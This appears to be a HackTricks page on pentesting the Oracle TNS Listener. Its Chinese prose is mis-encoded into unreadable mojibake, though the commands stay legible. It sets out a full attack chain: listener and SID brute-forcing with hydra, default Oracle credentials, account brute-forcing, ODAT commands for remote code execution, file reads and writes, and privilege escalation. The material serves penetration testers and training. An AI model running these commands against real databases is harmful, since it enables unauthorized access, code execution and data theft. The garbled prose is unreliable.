# 1521,1522-1529 - Pentesting Oracle TNS Listener

<details>

<summary><strong>é€šè¿‡</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>ä»é›¶åˆ°è‹±é›„å­¦ä¹ AWSé»‘å®¢æ”»å‡»ï¼</strong></summary>

æ”¯æŒHackTricksçš„å…¶ä»–æ–¹å¼ï¼š

* å¦‚æœæ‚¨æƒ³åœ¨**HackTricksä¸­çœ‹åˆ°æ‚¨çš„å…¬å¸å¹¿å‘Š**æˆ–**ä»¥PDFæ ¼å¼ä¸‹è½½HackTricks**ï¼Œè¯·æŸ¥çœ‹[**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)ï¼
* è·å–[**å®˜æ–¹PEASS & HackTrickså•†å“**](https://peass.creator-spring.com)
* å‘ç°[**PEASSå®¶æ—**](https://opensea.io/collection/the-peass-family)ï¼Œæˆ‘ä»¬ç‹¬å®¶çš„[**NFTsç³»åˆ—**](https://opensea.io/collection/the-peass-family)
* **åŠ å…¥** ğŸ’¬ [**Discordç¾¤ç»„**](https://discord.gg/hRep4RUj7f) æˆ– [**telegramç¾¤ç»„**](https://t.me/peass) æˆ–åœ¨ **Twitter** ğŸ¦ ä¸Š**å…³æ³¨æˆ‘** [**@carlospolopm**](https://twitter.com/carlospolopm)**ã€‚**
* **é€šè¿‡å‘** [**HackTricks**](https://github.com/carlospolop/hacktricks) å’Œ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) githubä»“åº“æäº¤PRæ¥åˆ†äº«æ‚¨çš„é»‘å®¢æŠ€å·§ã€‚

</details>

## åŸºæœ¬ä¿¡æ¯

Oracleæ•°æ®åº“ï¼ˆOracle DBï¼‰æ˜¯Oracleå…¬å¸çš„å…³ç³»æ•°æ®åº“ç®¡ç†ç³»ç»Ÿï¼ˆRDBMSï¼‰ï¼ˆæ¥è‡ª[è¿™é‡Œ](https://www.techopedia.com/definition/8711/oracle-database)ï¼‰ã€‚

åœ¨æšä¸¾Oracleæ—¶ï¼Œç¬¬ä¸€æ­¥æ˜¯ä¸é€šå¸¸ä½äºé»˜è®¤ç«¯å£ï¼ˆ1521/TCPï¼Œ-æ‚¨ä¹Ÿå¯èƒ½åœ¨1522-1529ä¸Šè·å¾—æ¬¡è¦ç›‘å¬å™¨-ï¼‰çš„TNS-Listeneré€šä¿¡ã€‚
```
1521/tcp open  oracle-tns    Oracle TNS Listener 9.2.0.1.0 (for 32-bit Windows)
1748/tcp open  oracle-tns    Oracle TNS Listener
```
## æ¦‚è¦

1. **æšä¸¾ç‰ˆæœ¬**ä¿¡æ¯ï¼ˆæœç´¢**å·²çŸ¥æ¼æ´**ï¼‰
2. **æš´åŠ›ç ´è§£TNSç›‘å¬å™¨**é€šä¿¡ï¼ˆå¹¶éæ€»æ˜¯éœ€è¦ï¼‰
3. **æšä¸¾**/æš´åŠ›ç ´è§£**SIDåç§°**ï¼ˆå¦‚æ•°æ®åº“åç§°ï¼‰
4. å¯¹å‘ç°çš„æœ‰æ•ˆSIDåç§°**æš´åŠ›ç ´è§£å‡­è¯**
5. å°è¯•**æ‰§è¡Œä»£ç **

è¦ä½¿ç”¨MSF oracleæ¨¡å—ï¼Œæ‚¨éœ€è¦å®‰è£…ä¸€äº›ä¾èµ–é¡¹ï¼š[**å®‰è£…**](oracle-pentesting-requirements-installation.md)

## æšä¸¾

å¯ç”¨äºæ­¤çš„å·¥å…·æœ‰ï¼šnmapã€MSFå’Œ[tnscmd10g](http://dokfleed.net/files/audit/tnscmd10g.zip)ã€‚

### TNSç›‘å¬å™¨ç‰ˆæœ¬
```bash
nmap --script "oracle-tns-version" -p 1521 -T4 -sV <IP>
msf> use auxiliary/scanner/oracle/tnslsnr_version
#apt install tnscmd10g
tnscmd10g version -p 1521 -h <IP>
```
å…¶ä»–æœ‰ç”¨çš„ TNS ç›‘å¬å™¨å‘½ä»¤ï¼š

| **å‘½ä»¤**  | **ç›®çš„**                                                     |
| ------------ | --------------------------------------------------------------- |
| ping         | Ping ç›‘å¬å™¨                                               |
| version      | æä¾›ç›‘å¬å™¨ç‰ˆæœ¬å’Œå¹³å°ä¿¡æ¯çš„è¾“å‡º |
| status       | è¿”å›ç›‘å¬å™¨å½“å‰çŠ¶æ€å’Œä½¿ç”¨çš„å˜é‡    |
| services     | è½¬å‚¨æœåŠ¡æ•°æ®                                               |
| debug        | å°†è°ƒè¯•ä¿¡æ¯è½¬å‚¨åˆ°ç›‘å¬å™¨æ—¥å¿—                  |
| reload       | é‡æ–°åŠ è½½ç›‘å¬å™¨é…ç½®æ–‡ä»¶                          |
| save\_config | å°†ç›‘å¬å™¨é…ç½®æ–‡ä»¶å†™å…¥å¤‡ä»½ä½ç½®      |
| stop         | è°ƒç”¨ç›‘å¬å™¨å…³é—­                                        |

å¦‚æœä½ **æ”¶åˆ°é”™è¯¯**ï¼Œå¯èƒ½æ˜¯å› ä¸º**TNS ç‰ˆæœ¬ä¸å…¼å®¹**ï¼ˆä½¿ç”¨ `tnscmd10` å¸¦ä¸Š `--10G` å‚æ•°ï¼‰ï¼Œå¦‚æœ**é”™è¯¯æŒç»­å­˜åœ¨**ï¼Œç›‘å¬å™¨å¯èƒ½**å—å¯†ç ä¿æŠ¤**ï¼ˆä½ å¯ä»¥åœ¨è¿™é‡Œçœ‹åˆ°ä¸€ä¸ªåˆ—å‡ºæ‰€æœ‰[**è¯¦ç»†é”™è¯¯çš„åˆ—è¡¨**](https://docs.oracle.com/database/121/ERRMG/TNS-00000.htm#ERRMG-GUID-D723D931-ECBA-4FA4-BF1B-1F4FE2EEBAD7)ï¼‰â€”â€”åˆ«æ‹…å¿ƒâ€¦â€¦hydra æ¥æ•‘æ´\*\*ï¼š\*\*
```
hydra -P rockyou.txt -t 32 -s 1521 host.victim oracle-listener
```
TNS ç›‘å¬å™¨å¯èƒ½å®¹æ˜“å—åˆ° **MitM** æ”»å‡»ã€‚[ç‚¹å‡»æ­¤å¤„æŸ¥çœ‹å¦‚ä½•æ£€æŸ¥æœåŠ¡å™¨æ˜¯å¦å®¹æ˜“å—åˆ°æ”»å‡»ä»¥åŠå¦‚ä½•æ‰§è¡Œæ”»å‡»ï¼ˆé€‚ç”¨äºæ‰€æœ‰ç‰ˆæœ¬ï¼Œç›´åˆ° 12c ç‰ˆæœ¬ï¼‰](tns-poison.md)ã€‚

### SID æšä¸¾

#### **ä»€ä¹ˆæ˜¯ SID**

SIDï¼ˆæœåŠ¡æ ‡è¯†ç¬¦ï¼‰æœ¬è´¨ä¸Šæ˜¯æ•°æ®åº“åç§°ï¼Œæ ¹æ®å®‰è£…æƒ…å†µï¼Œæ‚¨å¯èƒ½æœ‰ä¸€ä¸ªæˆ–å¤šä¸ªé»˜è®¤çš„ SIDsï¼Œæˆ–è€…ç”šè‡³æ˜¯å®Œå…¨è‡ªå®šä¹‰çš„ dba å®šä¹‰çš„ SIDã€‚

**åœ¨ä¸€äº›æ—§ç‰ˆæœ¬ä¸­ï¼ˆåœ¨ 9 ç‰ˆæœ¬ä¸­æœ‰æ•ˆï¼‰**ï¼Œæ‚¨å¯ä»¥è¯·æ±‚ SIDï¼Œæ•°æ®åº“ä¼šå°†å…¶å‘é€ç»™æ‚¨ï¼š
```bash
tnscmd10g status-p 1521 -h <IP> #The SID are inside: SERVICE=(SERVICE_NAME=<SID_NAME>)

#msf1
msf> use auxiliary/scanner/oracle/sid_enum
msf> set rhost <IP>
msf> run
#msf2
msf> use auxiliary/admin/oracle/tnscmd
msf> set CMD (CONNECT_DATA=(COMMAND=STATUS))
msf> set rhost <IP>
msf> run #The SID are inside: SERVICE=(SERVICE_NAME=<SID_NAME>)
```
å¦‚æœæ‚¨æ— æ³•é€šè¿‡è¿™ç§æ–¹å¼è®¿é—®SIDï¼Œæ‚¨å°†éœ€è¦å¯¹å®ƒä»¬è¿›è¡Œæš´åŠ›ç ´è§£ï¼š

**SID æš´åŠ›ç ´è§£**

æˆ‘å·²ç»å°†nmapå’ŒMSFçš„sidåˆ—è¡¨åˆå¹¶åˆ°è¿™ä¸ªåˆ—è¡¨ä¸­ï¼ˆæ²¡æœ‰é‡å¤é¡¹ï¼‰ï¼š

{% file src="../../.gitbook/assets/sids-oracle.txt" %}
```bash
hydra -L /usr/share/metasploit-framework/data/wordlists/sid.txt -s 1521 <IP> oracle-sid
patator oracle_login host=<IP> sid=FILE0 0=sids-oracle.txt -x ignore:code=ORA-12505
./odat.py sidguesser -s $SERVER -d $SID --sids-file=./sids.txt
msf> use auxiliary/admin/oracle/sid_brute #This will use the list located at /usr/share/metasploit-framework/data/wordlists/sid.txt
nmap --script +oracle-sid-brute -p 1521 10.11.1.202 #This will use the list lcated at /usr/share/nmap/nselib/data/oracle-sids
```
ä¸ºäº†ä½¿ç”¨ **patator** çš„ **oracle\_login** åŠŸèƒ½ï¼Œä½ éœ€è¦**å®‰è£…**ï¼š
```
pip3 install cx_Oracle --upgrade
```
## **é’ˆå¯¹è´¦æˆ·**

**è·å¾—SIDäº†å—ï¼Ÿ** å¾ˆå¥½ï¼Œç°åœ¨è®©æˆ‘ä»¬è¿›è¡Œä¸‹ä¸€ä¸ªä»»åŠ¡ï¼Œæå–ç”¨æˆ·è´¦æˆ·ä¿¡æ¯ã€‚ä»è¿™ä¸€ç‚¹å¼€å§‹ï¼Œæ‚¨å¯ä»¥è¿æ¥åˆ°ç›‘å¬å™¨å¹¶æš´åŠ›ç ´è§£å‡­æ®ã€‚

**Metasploit** _\*\*scanner/oracle/oracle\_login_ å®ƒå†…ç½®äº†ä¸€ä¸ªå­—å…¸ï¼Œç”¨äº**æœ€å¸¸è§çš„ç”¨æˆ·è´¦æˆ·ä¿¡æ¯é»˜è®¤å€¼**ï¼Œå‘ˆç°ä¸ºç™»å½•å:å¯†ç ã€‚é¡ºä¾¿è¯´ä¸€ä¸‹ï¼Œè¿™æ ·çš„é»˜è®¤æ¡ç›®ä»£è¡¨äº†Oracleä¸­æœ€å¸¸è§å’Œæœ€ä¸¥é‡çš„å®‰å…¨é—®é¢˜ä¹‹ä¸€ã€‚

**Nmap** ä¹Ÿå¯ä»¥åœ¨è¿™é‡Œæä¾›å¸®åŠ©ï¼Œä½¿ç”¨è„šæœ¬ _oracle-brute_ã€‚è¯·æ³¨æ„ï¼Œæ­¤è„šæœ¬**æ··åˆäº†ç™»å½•åå’Œå¯†ç **ï¼Œå³å®ƒå°è¯•å°†æ¯ä¸ªç™»å½•åä¸æ¯ä¸ªå¯†ç è¿›è¡ŒåŒ¹é…ï¼Œè¿™éœ€è¦ç›¸å½“é•¿çš„æ—¶é—´ï¼

### **é»˜è®¤å¯†ç **

ä»¥ä¸‹æ˜¯ä¸€äº›ä¸Oracleå…³è”çš„é»˜è®¤å¯†ç ï¼š

* **DBSNMP/DBSNMP**â€Šâ€”â€Šæ™ºèƒ½ä»£ç†ä½¿ç”¨å®ƒä¸æ•°æ®åº“æœåŠ¡å™¨é€šä¿¡ï¼ˆæ›´æ”¹å®ƒéœ€è¦ä¸€äº›å·¥ä½œï¼‰
* **SYS/CHANGE\_ON\_INSTALL**â€Šâ€”â€ŠåŒ…æ‹¬Oracle v9ä¹‹å‰çš„é»˜è®¤sysdbaè´¦æˆ·ï¼Œä»10gç‰ˆæœ¬å¼€å§‹å¿…é¡»ä¸åŒï¼
* **PCMS\_SYS/PCMS\_SYS**â€Šâ€”â€Šé»˜è®¤xè´¦æˆ·
* **WMSYS/WMSYS**â€Šâ€”â€Šé»˜è®¤xè´¦æˆ·
* **OUTLN/OUTLN**â€Šâ€”â€Šé»˜è®¤xè´¦æˆ·
* **SCOTT/TIGER**â€Šâ€”â€Šé»˜è®¤xè´¦æˆ·

å…¶ä»–**é»˜è®¤å¯†ç **å¯ä»¥åœ¨[è¿™é‡Œ](http://www.petefinnigan.com/default/oracle\_default\_passwords.htm)å’Œ[è¿™é‡Œ](https://cirt.net/passwords?vendor=Oracle)æ‰¾åˆ°ã€‚

ç‰ˆæœ¬11.1.0.6ã€11.1.0.7ã€11.2.0.1ã€11.2.0.2å’Œ11.2.0.3å®¹æ˜“å—åˆ°**ç¦»çº¿æš´åŠ›ç ´è§£**çš„æ”»å‡»ã€‚[**åœ¨è¿™é‡Œé˜…è¯»æ›´å¤šå…³äºè¿™ç§æŠ€æœ¯çš„ä¿¡æ¯ã€‚**](remote-stealth-pass-brute-force.md)

### ç”¨æˆ·/å¯†ç æš´åŠ›ç ´è§£

ä¸åŒçš„å·¥å…·æä¾›äº†**ä¸åŒçš„oracleç”¨æˆ·/å¯†ç åˆ—è¡¨**ï¼š

* **oscan:** _/usr/share/oscanner/accounts.default_ (169è¡Œ)
* **MSF-1:** _æ¥è‡ª_ admin/oracle/oracle\_login \_\_/usr/share/metasploit-framework/data/wordlists/oracle\_default\_passwords.csv (598è¡Œ)
* **MSF-2:** _æ¥è‡ª scanner/oracle/oracle\_login_ _/usr/share/metasploit-framework/data/wordlists/oracle\_default\_userpass.txt_ (568è¡Œ)
* **Nmap:** _/usr/share/nmap/nselib/data/oracle-default-accounts.lst_ (687è¡Œ)

æˆ‘å·²ç»**æ··åˆäº†**æ‰€æœ‰è¿™äº›åˆ—è¡¨å¹¶**ç§»é™¤äº†é‡å¤é¡¹**ï¼š

{% file src="../../.gitbook/assets/users-oracle.txt" %}

{% file src="../../.gitbook/assets/pass-oracle.txt" %}

### [æš´åŠ›ç ´è§£](../../generic-methodologies-and-resources/brute-force.md#oraclesql)

ç°åœ¨ï¼Œæ‚¨**çŸ¥é“äº†æœ‰æ•ˆçš„SIDå’Œæœ‰æ•ˆçš„å‡­æ®**ã€‚è¦è¿æ¥åˆ°æ•°æ®åº“ï¼Œæ‚¨éœ€è¦å·¥å…·ï¼š_**sqlplus**_ï¼Œå¹¶ä¸”éœ€è¦æŒ‰ç…§ä¸€äº›æ­¥éª¤è¿›è¡Œå®‰è£…ï¼š

[å®‰è£…](oracle-pentesting-requirements-installation.md)

ä½¿ç”¨å·²çŸ¥å‡­æ®ç™»å½•ï¼š
```
sqlplus <username>/<password>@<ip_address>/<SID>;
```
å¦‚æœ TNS ç›‘å¬å™¨ä½äºéé»˜è®¤ç«¯å£ï¼ˆä¾‹å¦‚ TCP/1522ï¼‰ï¼š
```
sqlplus <username>/<password>@<ip_address>:<port>/<SID>;
```
å¦‚æœä¸€ä¸ª**è´¦æˆ·å…·æœ‰ç³»ç»Ÿæ•°æ®åº“æƒé™ï¼ˆsysdbaï¼‰æˆ–ç³»ç»Ÿæ“ä½œå‘˜ï¼ˆsysopï¼‰**ï¼Œä½ å¯èƒ½æƒ³å°è¯•ä»¥ä¸‹æ“ä½œï¼š
```bash
sqlplus <username>/<password>@<ip_address>/<SID> 'as sysdba';
#Example:
sqlplus SYSTEM/MANAGER@192.168.0.2/ORCL 'as sysdba'
```
## **All in One**

**ä¸€ä¸ªæœ‰è¶£çš„å·¥å…·æ˜¯ oscanner**ï¼Œå®ƒä¼šå°è¯•è·å–ä¸€äº›æœ‰æ•ˆçš„SIDï¼Œç„¶åå®ƒä¼šæš´åŠ›ç ´è§£æœ‰æ•ˆå‡­è¯å¹¶å°è¯•æå–ä¸€äº›ä¿¡æ¯ï¼š
```bash
#apt install oscanner
oscanner -s <IP> -P <PORT>
```
å¦ä¸€ä¸ªå¯ä»¥å®Œæˆæ‰€æœ‰è¿™äº›ä»»åŠ¡çš„å·¥å…·æ˜¯ [**odat**](https://github.com/quentinhardy/odat)ï¼š
```bash
git clone https://github.com/quentinhardy/odat.git
cd odat
./odat.py --help #It shouldn't be problems in Kali
./odat.py all -s <IP> -p <PORT>
./odat.py all -s <IP> -p <PORT> -d <SID> #To bruteforce accounts for that SID
```
ä½¿ç”¨è¿™äº›é€‰é¡¹ï¼ˆ_-s_ å’Œ _-p_ï¼‰ï¼ŒODAT å°†åœ¨ç¬¬ä¸€æ­¥ä¸­**æœç´¢æœ‰æ•ˆçš„ SID**ï¼ˆç³»ç»Ÿ IDï¼‰ã€‚æ‚¨å¯ä»¥é…ç½®ä¸€äº›é€‰é¡¹æ¥é…ç½®æ–¹æ³•ï¼ˆä¾‹å¦‚ï¼Œå•è¯åˆ—è¡¨æˆ–æš´åŠ›ç ´è§£æ”»å‡»ï¼‰ã€‚é»˜è®¤æƒ…å†µä¸‹ï¼ŒODAT å°†ä½¿ç”¨ä¸€ä¸ªå¤§å•è¯åˆ—è¡¨ï¼Œå¹¶ä¸”å®ƒå°†è¿›è¡Œä¸€æ¬¡å°å‹æš´åŠ›ç ´è§£æ”»å‡»ã€‚

å¦‚æœ ODAT **è‡³å°‘æ‰¾åˆ°ä¸€ä¸ª SID**ï¼ˆä¾‹å¦‚ _ORCL_ï¼‰ï¼Œå®ƒå°†**æœç´¢æœ‰æ•ˆçš„ Oracle è´¦æˆ·**ã€‚å®ƒå°†å¯¹**æ¯ä¸ªæ‰¾åˆ°çš„ SID**æ‰§è¡Œæ­¤æ“ä½œã€‚æ‚¨å¯ä»¥ä¸ºå‡­æ®æŒ‡å®šä¸€äº›é€‰é¡¹ï¼ˆä¾‹å¦‚ï¼Œ_--accounts-file_ã€_--accounts-files_ã€_--login-as-pwd_ï¼‰ã€‚

å¯¹äº**æ¯ä¸ªæœ‰æ•ˆçš„è´¦æˆ·**ï¼ˆä¾‹å¦‚ _SYS_ï¼‰**åœ¨æ¯ä¸ªæœ‰æ•ˆçš„å®ä¾‹**ï¼ˆSIDï¼‰ä¸Šï¼ŒODAT å°†è¿”å›**æ¯ä¸ª Oracle ç”¨æˆ·èƒ½åšä»€ä¹ˆ**ï¼ˆä¾‹å¦‚ï¼Œåå‘ shellï¼Œè¯»å–æ–‡ä»¶ï¼Œæˆä¸º DBAï¼‰ã€‚

[**Wiki odat**](https://github.com/quentinhardy/odat/wiki)

## è¿œç¨‹ä»£ç æ‰§è¡Œ

è‡³å°‘æœ‰ä¸¤ç§ä¸åŒçš„æ–¹æ³•å¯ä»¥æ‰§è¡Œå‘½ä»¤ï¼Œä¾‹å¦‚ä½¿ç”¨ Java ç¨‹åºå’Œ DBMS_SCHEDULER åŒ…ã€‚é¡ºä¾¿è¯´ä¸€ä¸‹ï¼Œå¦‚æœ SQL æ³¨å…¥åœ¨ä¸€ä¸ªç½‘ç»œåº”ç”¨ç¨‹åºä¸­ï¼Œå¹¶ä¸”è¿è¡Œå®ƒçš„ç”¨æˆ·æœ‰è¶³å¤Ÿçš„æƒé™ï¼Œæ‚¨ä¹Ÿå¯ä»¥å®ç° RCEã€‚åœ¨è¿™ä¸ªé˜¶æ®µï¼Œæˆ‘å¼ºçƒˆæ¨èå‡†å¤‡ Oracle æ•°æ®åº“æ”»å‡»å·¥å…·ï¼š[ODAT](https://github.com/quentinhardy/odat)ã€‚

### å®‰è£… ODAT
```bash
git clone https://github.com/quentinhardy/odat.git
cd odat
./odat.py #It shouldn't be problems in Kali
```
### é€šè¿‡Javaå­˜å‚¨è¿‡ç¨‹æ‰§è¡Œä»£ç 
```bash
./odat.py java -s <IP> -U <username> -P <password> -d <SID> --exec COMMAND
```
[æ›´å¤šè¯¦æƒ…è¯·è§æ­¤å¤„](oracle-rce-and-more.md#rce-java-store-procedure)

### é€šè¿‡è°ƒåº¦å™¨æ‰§è¡Œä»£ç 
```bash
./odat.py dbmsscheduler -s <IP> -d <SID> -U <username> -P <password> --exec "C:\windows\system32\cmd.exe /c echo 123&gt;&gt;C:\hacK"
```
[æ›´å¤šè¯¦æƒ…](oracle-rce-and-more.md#rce-scheduler)

### é€šè¿‡å¤–éƒ¨è¡¨æ‰§è¡Œä»£ç 
```bash
./odat.py externaltable -s <IP> -U <username> -P <password> -d <SID> --exec "C:/windows/system32" "calc.exe"
```
`ODAT.py` éœ€è¦ `CREATE ANY DIRECTORY` æƒé™ï¼Œè¯¥æƒé™é»˜è®¤åªæˆäºˆ DBA è§’è‰²ï¼Œå› ä¸ºå®ƒå°è¯•ä»ä»»ä½•ç›®å½•è€Œä¸ä»…ä»…æ˜¯â€œä½ çš„â€ç›®å½•æ‰§è¡Œæ–‡ä»¶ï¼ˆè¿™ç§æ”»å‡»çš„æ‰‹åŠ¨ç‰ˆæœ¬éœ€è¦çš„æƒé™è¾ƒå°‘ï¼‰ã€‚

[æ›´å¤šè¯¦æƒ…ç‚¹å‡»è¿™é‡Œã€‚](oracle-rce-and-more.md#rce-external-tables)

## è¯»/å†™æ–‡ä»¶
```bash
./odat.py utlfile -s <IP> -d <SID> -U <username> -P <password> --getFile "C:/test" token.txt token.txt
./odat.py externaltable -s <IP> -U <username> -P <password> -d <SID> --getFile "C:/test" "my4.txt" "my"
```
[æ›´å¤šè¯¦æƒ…è¯·è§æ­¤å¤„](oracle-rce-and-more.md#read-write-files)

## æå‡æƒé™

[æ›´å¤šè¯¦æƒ…è¯·è§æ­¤å¤„](oracle-rce-and-more.md#elevating-privileges)

æ‚¨å¯ä»¥ä½¿ç”¨ odat çš„ [privesc](https://github.com/quentinhardy/odat/wiki/privesc) æ¨¡å—æ¥æå‡æƒé™ã€‚åœ¨è¯¥é“¾æ¥ä¸­ï¼Œæ‚¨å¯ä»¥æ‰¾åˆ°**ä½¿ç”¨ odat æå‡æƒé™çš„å¤šç§æ–¹å¼ã€‚**
```bash
./odat.py privesc -s $SERVER -d $ID -U $USER -P $PASSWORD -h #Get module Help
```
æ¼æ´åœ¨ oracle 10.1.0.3.0 ä¸Šè¿›è¡Œäº†æµ‹è¯• - åº”è¯¥é€‚ç”¨äº 10.1.0.5.0ï¼Œå¹¶ä¸”æ®è¯´é€‚ç”¨äº 11gã€‚é€šè¿‡ 2007 å¹´ 10 æœˆ Oracle å…³é”®è¡¥ä¸æ›´æ–°ä¿®å¤ã€‚
```bash
msf> use auxiliary/sqli/oracle/lt_findricset_cursor
```
## å…è´¹è™šæ‹Ÿç¯å¢ƒè¿›è¡Œæµ‹è¯•

å¦‚æœæ‚¨æƒ³ç»ƒä¹ æ”»å‡»Oracleæ•°æ®åº“ï¼Œæœ€å®‰å…¨çš„æ–¹æ³•æ˜¯æ³¨å†ŒOracle Developer Days Virtualbox VMï¼š

{% embed url="http://www.oracle.com/technetwork/database/enterprise-edition/databaseappdev-vm-161299.html" %}

è¿™ç¯‡æ–‡ç« ä¸­çš„å¤§éƒ¨åˆ†ä¿¡æ¯æ‘˜è‡ªï¼š[https://medium.com/@netscylla/pentesters-guide-to-oracle-hacking-1dcf7068d573](https://medium.com/@netscylla/pentesters-guide-to-oracle-hacking-1dcf7068d573) å’Œ [https://hackmag.com/uncategorized/looking-into-methods-to-penetrate-oracle-db/](https://hackmag.com/uncategorized/looking-into-methods-to-penetrate-oracle-db/)

å…¶ä»–æœ‰è¶£çš„**å‚è€ƒèµ„æ–™**ï¼š

[http://blog.opensecurityresearch.com/2012/03/top-10-oracle-steps-to-secure-oracle.html](http://blog.opensecurityresearch.com/2012/03/top-10-oracle-steps-to-secure-oracle.html)

## HackTricksè‡ªåŠ¨å‘½ä»¤
```
Protocol_Name: Oracle    #Protocol Abbreviation if there is one.
Port_Number:  1521     #Comma separated if there is more than one.
Protocol_Description: Oracle TNS Listener         #Protocol Abbreviation Spelled out

Entry_1:
Name: Notes
Description: Notes for Oracle
Note: |
Oracle database (Oracle DB) is a relational database management system (RDBMS) from the Oracle Corporation

#great oracle enumeration tool
navigate to https://github.com/quentinhardy/odat/releases/
download the latest
tar -xvf odat-linux-libc2.12-x86_64.tar.gz
cd odat-libc2.12-x86_64/
./odat-libc2.12-x86_64 all -s 10.10.10.82

for more details check https://github.com/quentinhardy/odat/wiki

https://book.hacktricks.xyz/pentesting/1521-1522-1529-pentesting-oracle-listener

Entry_2:
Name: Nmap
Description: Nmap with Oracle Scripts
Command: nmap --script "oracle-tns-version" -p 1521 -T4 -sV {IP}
```
<details>

<summary><strong>ä»é›¶åˆ°è‹±é›„å­¦ä¹ AWSé»‘å®¢æ”»å‡»</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>ï¼</strong></summary>

æ”¯æŒHackTricksçš„å…¶ä»–æ–¹å¼ï¼š

* å¦‚æœæ‚¨æƒ³åœ¨**HackTricksä¸­çœ‹åˆ°æ‚¨çš„å…¬å¸å¹¿å‘Š**æˆ–**ä»¥PDFæ ¼å¼ä¸‹è½½HackTricks**ï¼Œè¯·æŸ¥çœ‹[**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)ï¼
* è·å–[**å®˜æ–¹PEASS & HackTrickså•†å“**](https://peass.creator-spring.com)
* å‘ç°[**PEASSå®¶æ—**](https://opensea.io/collection/the-peass-family)ï¼Œæˆ‘ä»¬ç‹¬å®¶çš„[**NFTsç³»åˆ—**](https://opensea.io/collection/the-peass-family)
* **åŠ å…¥** ğŸ’¬ [**Discordç¾¤ç»„**](https://discord.gg/hRep4RUj7f) æˆ– [**telegramç¾¤ç»„**](https://t.me/peass) æˆ–åœ¨**Twitter** ğŸ¦ ä¸Š**å…³æ³¨**æˆ‘ [**@carlospolopm**](https://twitter.com/carlospolopm)**ã€‚**
* **é€šè¿‡å‘** [**HackTricks**](https://github.com/carlospolop/hacktricks) å’Œ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) githubä»“åº“æäº¤PRæ¥åˆ†äº«æ‚¨çš„é»‘å®¢æŠ€å·§ã€‚

</details>
